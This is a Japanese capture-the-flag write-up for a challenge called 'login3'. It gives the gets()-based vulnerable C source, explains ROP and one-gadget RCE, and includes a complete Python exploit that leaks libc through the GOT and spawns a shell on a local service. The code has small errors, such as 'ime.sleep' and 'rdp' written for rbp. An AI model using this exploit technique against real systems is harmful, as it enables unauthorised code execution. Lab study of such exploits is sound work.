# login3
## ソースコード
```c
//  gcc login3.c -o login3 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

void setup()
{
    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main()
{
    char id[0x20] = "";

    setup();

    printf("ID: ");
    gets(id);

    if (strcmp(id, "admin") == 0)
        printf("Login Succeeded\n");
    else
        printf("Invalid ID\n");
}
```
## 問題の概要
パスワードは要求されず、IDとしてadminを入力するとログインできるがflagは出力されない。  
そもそもフラグを読み込んでいないので、どこに処理を飛ばしてもフラグを得ることはできない。  
そこで、/bin/shを実行して、コマンドを実行できるようにしてflagを探す。  


## One-gadget RCE
One-gadget RCE(Remote Code Execution)とは、libcに存在するガジェットで、そこに実行を移すだけで/bin/shが起動するアドレス。  
ここでガジェットとは、後述の、ROP(Return-oriented programming)で使用できる一塊の処理のことを指す。


## ASLRとその回避


## Return-oriented programming
Return-oriented programmingとは、スタックバッファオーバーフローから、関数の呼び出しやret直前のアドレスへのジャンプを重ねて目的の処理を実行する手法。  

## 攻略
login3のmain関数の実行時のスタックの内容は以下の通り。

|アドレス|サイズ|内容|
|:---|:---|:---|
|rdp-0x20|0x20|id|
|rdp|0x08|古いrdpの値|
|rdp+0x8|0x08|main関数からの戻り先のアドレス|  


これを以下のように書き換える。

|アドレス|サイズ|値|内容|
|:---|:---|:---|:---|
|rdp-0x20|0x20|aaaa...|id|
|rdp|0x08|aaaa...|古いrdpの値|
|rdp+0x8|0x08|0x4012d3|pop rdi; ret|
|rdp+0x10|0x08|0x404020|GOT の printf|
|rdp+0x18|0x08|0x401030|PLT の puts|
|rdp+0x20|0x08|0x4011e1|main|  


二回目のスタックバッファオーバーフローではrdp+0x8をOne-gadget RCEのアドレスに書き換える。  

問題サーバーのlibc-2.31.soをダウンロードして、printf関数とOne-gedget RCEのアドレスを調べる。  
その際、OneGadget(https://github.com/david942j/one_gadget)
と呼ばれるツールを使用する。  
```
objdump -T libc-2.31.so | grep ' printf'
bundle exec one_gadget /path/to/libc-2.31.so
```

```
:
0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
[r15] == NULL || r15 == NULL
[rdx] == NULL || rdx == NULL
:
```
上記ガジェットを使用する。
## 攻略
ROPによる攻撃をPython3で実装する。
```python
import socket, time, struct, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10003))

ime.sleep(1)
print(s.recv(1000))
s.sendall(
    b'a'*0x28 +
    struct.pack('<Q', 0x4012d3) + # pop rdi
    struct.pack('<Q', 0x404020) + # printf
    struct.pack('<Q', 0x401030) + # puts
    struct.pack('<Q', 0x4011e1) + # main
    b'\n')

time.sleep(1)
d = s.recv(1000)
print(d)
printf = struct.unpack('<Q', d.split(b'\n')[1].ljust(8, b'\0'))[0]
print('printf: %x'%printf)

rce = (printf
    - 0x64e10 # printf
    + 0xe6af1) # One-gadget RCE

s.sendall(
    b'a'*0x28 +
    struct.pack('<Q', rce) +
    b'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

```
